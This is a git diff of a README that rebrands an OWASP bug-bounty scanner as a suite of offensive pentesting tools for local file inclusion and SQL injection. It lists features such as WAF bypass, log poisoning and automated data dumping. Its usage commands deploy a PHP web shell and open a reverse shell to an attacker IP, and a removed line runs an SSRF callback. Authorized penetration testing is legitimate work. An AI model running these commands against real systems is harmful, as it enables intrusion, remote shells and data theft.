@@ -1,61 +1,78 @@
-# OT10-Scanner: Industrial OWASP Top 10 Framework
+# SD-DEVSECOPS: Advanced Pentesting Checkers Suite
 
-OT10-Scanner is a modular, industrial-grade automated security auditing framework designed specifically for Bug Bounty hunters. It orchestrates a suite of specialized modules to hunt for OWASP Top 10 vulnerabilities with a heavy focus on WAF evasion, high-performance heuristics, and actionable proofs.
+![Python Version](https://img.shields.io/badge/python-3.x-blue.svg)
+![License](https://img.shields.io/badge/license-MIT-green.svg)
+![Category](https://img.shields.io/badge/category-Pentesting-red.svg)
 
-## 🚀 Professional Upgrades (v2.0)
+A collection of high-performance, automated security tools designed for rapid enumeration, vulnerability discovery, and exploitation. Built for professionals and security researchers.
 
-- **Standardized Request Ingestion**: All core modules now natively support raw HTTP request files (Burp-style) via the `-r/--request` flag.
-- **Aggressive SD-QLi Merge**: Integrated v2.8 high-performance heuristics including **Aggressive Login Bypass** (negative detection learning) and **Global Recursion** harvesting.
-- **Industrial Safety Limits**: Strictly enforced `LIMIT 20` on all database dumps to ensure audit safety and bug-bounty compliance.
-- **Centralized Engine**: New `evasion_utils.py` core for unified request parsing and consolidated reporting across the entire suite.
-- **Detailed Manual Proofs**: Master reports now include actionable `curl` commands for manual validation of every finding.
+---
 
-## 🚀 Key Features
+## 🛠️ Included Tools
 
-- **Industrial Orchestration**: A single master runner (`owasp_checker.py`) that manages high-tier specialized modules.
-- **Advanced Evasion Engine**: Over 150+ payload variations using multi-layer encoding (Double-URL, Unicode, HPP) and junk header injection.
-- **Consolidated Reporting**: Domain-specific persistence that auto-generates folders and individual bounty reports.
-- **Global Auth Support**: Single-flag cookie and header injection across all modules.
+### 1. LFI-FILLER (v3.1)
+The ultimate framework for Local File Inclusion discovery and exploitation.
+- **Key Features**: Multi-threaded, WAF Bypasses, PHP Filter Chaining, Log/SSH Poisoning, Automated Shells.
+- **Main Script**: `lfiller.py`
+- **[Quick Usage Guide Pin](#-lfi-filler-v31-quick-usage)**
 
-## 🛠️ Specialized Modules
+### 2. SD-QLi (v1.1)
+High-speed SQL injection scanner and automated exfiltration tool.
+- **Key Features**: Error/Time/Boolean-blind detection, UNION column discovery, Auto-Data Dump, WAF Tamper scripts.
+- **Main Script**: `sd-qli.py`
+- **[Quick Usage Guide Pin](#-sd-qli-v10-quick-usage)**
 
-| Module | Core Capability | Status |
-| :--- | :--- | :--- |
-| `sd-qli.py` | Professional SQLi (Aggressive Bypass, Global Harvesting) | 🛡️ v2.8 Final |
-| `ssrf_pro.py` | SSRF & Redirect Bypass (Cloud Metadata, IP Obfuscation) | ☁️ Cloud-Ready |
-| `lfiller.py` | Advanced LFI/RCE (Standardized Ingestion, Stable V3) | ☣️ Industrial |
-| `rce_fuzzer.py` | SSTI & Safe File Upload Probes | ⚡ High-Impact |
-| `infohunter.py` | Misconfig & Info Disclosure "Quick Wins" | 💸 Profitable |
-| `access_checker.py` | IDOR & Broken Access Control Discovery | 🔑 Critical |
+---
 
-## 📖 Usage Examples
+## 🚀 LFI-FILLER v3.1 Quick Usage
 
-### 1. Master Request Audit (Burp-Style)
+Scan and attempt to deploy a PHP web shell:
 ```bash
-python owasp_checker.py -r req.txt -All -e all
+python3 lfiller.py -u "http://target.com/view.php" -webshell
 ```
 
-### 2. High-Performance SQLi Harvesting
+Reverse shell via LHost:
 ```bash
-python sd-qli.py -r req.txt --dbs --dump
+python3 lfiller.py -u "http://target.com/view.php" -lh YOUR_IP -lp 4444
 ```
 
-### 3. Authenticated LFI to RCE Chain
+---
+
+## 🚀 SD-QLi v1.1 Quick Usage
+
+Fast scan and automated data exfiltration:
 ```bash
-python owasp_checker.py -u http://target.com -lfi -lh <KALI_IP> -w --cookie "session=123"
+python3 sd-qli.py -u "http://target.com/products.php?id=1"
 ```
 
-### 4. Direct Cloud Metadata SSRF
+POST-based injection test:
 ```bash
-python ssrf_pro.py -r req.txt -ex callback.com
+python3 sd-qli.py -u "http://target.com/login.php" -m POST -d "user=admin&pass=123"
 ```
 
-## 🛡️ Safety & Responsibility
+---
 
-This tool is built for **authorized security auditing only**. 
-- It uses **read-only** logic for primary proofs.
-- It **limits** data exfiltration to 20 records per table.
-- It is designed to be **safe** for production environments during bug bounty operations.
+## 🧪 Advanced Features Comparison
 
-## 📜 License
-*Created by Antigravity & The Industrial Audit Team*
+| Feature | LFI-FILLER | SD-QLi |
+|---------|------------|-------------|
+| **Multi-threading** | ✅ | ✅ |
+| **WAF Bypass** | ✅ (Encoding) | ✅ (Tamper) |
+| **RCE Vectors** | 10+ | ✅ (Outfile/CMDShell) |
+| **Auto-Exploitation** | ✅ | ✅ |
+| **OSCP Ready** | ✅ | ✅ |
+
+## 📦 Installation
+
+```bash
+git clone https://github.com/SD-DEVSECOPS/CHECKERS.git
+cd CHECKERS
+pip install requests
+```
+
+## ⚠️ Disclaimer
+
+This suite is for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not have permission to test is illegal. The author is not responsible for any misuse or damage caused by these utilities.
+
+---
+**Maintained by SD-DEVSECOPS**
